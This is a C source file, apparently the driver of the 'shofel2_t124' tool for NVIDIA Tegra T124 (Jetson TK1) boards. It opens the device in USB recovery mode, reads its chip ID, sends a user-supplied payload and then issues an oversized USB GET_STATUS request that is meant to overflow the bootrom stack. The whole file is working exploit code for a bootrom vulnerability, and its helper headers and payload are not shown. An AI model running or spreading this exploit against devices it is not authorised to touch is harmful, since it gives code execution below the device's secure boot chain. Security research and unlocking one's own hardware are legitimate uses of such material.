#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "t124.h"
#include "rcm.h"
#include "mini_libusb.h"

void print_hex_memory( void *mem, size_t size ) {
  uint8_t *p = (uint8_t *)mem;
  for ( int i = 0; i < size ; i++ ) {
    if ( ( ( i % 16 ) == 0 ) && i )
      printf( "\n" );
    printf( "0x%02x ", p[i] );
  }
  printf( "\n" );
}

int main( int argc, char *argv[] ) {

    int _ret_main = -1;
    int rcm_usb = 0;

    if ( ( argc != 2 ) && ( argc != 3 ) ) {
        fprintf( stderr, "Error: invalid argument count. shofel2_t124 payload.bin [arm|thumb]\nThumb mode will be used by default.\n" );
        goto exit;
    }
    
    uint32_t payload_thumb_mode = 1;
    if ( ( argc == 3 ) && ( argv[2][0] == 'a' ) ) {
        payload_thumb_mode = 0;
    }


  // ---- INIT RCM ----

    printf( "Waiting T124 to enter RCM mode (ctrl-c to cancel). Note: root permission could be required.\n" );
    rcm_usb = usb_open_by_vid_pid( (uint16_t)JETSON_TK1_VID, (uint16_t)JETSON_TK1_PID, 1 );
    printf( "K1 in RCM mode connected.\n" );
    if ( rcm_usb < 0 ) {
        fprintf( stderr, "Error: Couldn't open the usb.\n" );
        goto exit;
    }

    uint8_t chip_id_buf[RCM_CHIP_ID_LEN];
    memset( &chip_id_buf, 0, sizeof(chip_id_buf) );

    int ret = usb_send_bulk_txn( rcm_usb, RCM_EP1_IN, RCM_CHIP_ID_LEN, chip_id_buf );
    if ( ret < 0 ) {
        fprintf( stderr, "Error: Couldn't read Chip ID. Please reset T124 in RCM mode again.\n" );
        goto exit;
    }
    printf( "Chip ID: " );
    print_hex_memory( chip_id_buf, RCM_CHIP_ID_LEN );

  //-----------------------


  // ---- SEND PAYLOAD ----
  
    ret = send_rcm_cmd(rcm_usb, argv[1], payload_thumb_mode);
    if ( ret < 0 ) {
        printf( "Error: Couldn't send RCM CMD.\n" );
        goto exit;
    }

  //----------------------


  // ---- RUN EXPLOIT ----
  
    uint8_t data[BOOTROM_SMASH_LEN];
    ret = usb_send_control_txn( rcm_usb, USB_CTRL_DEVICE_ENDPOINT_TO_HOST,
            USB_CTRL_GET_STATUS, 0, 0, BOOTROM_SMASH_LEN, data, 500 );
    if ( ret == 0 ) {
        printf( "Error: Hacky Get Status finished correctly... Not cool :-(\n" );
        print_hex_memory( data, sizeof(data) );
        goto exit;
    }

    printf( "Hacky Get Status returned error... Probably the stack got smashed, Congrats :-)\n" );

    //----------------------

    _ret_main = 0;

exit:
    if ( rcm_usb > 0 ) usb_close( rcm_usb );

    return _ret_main;

}

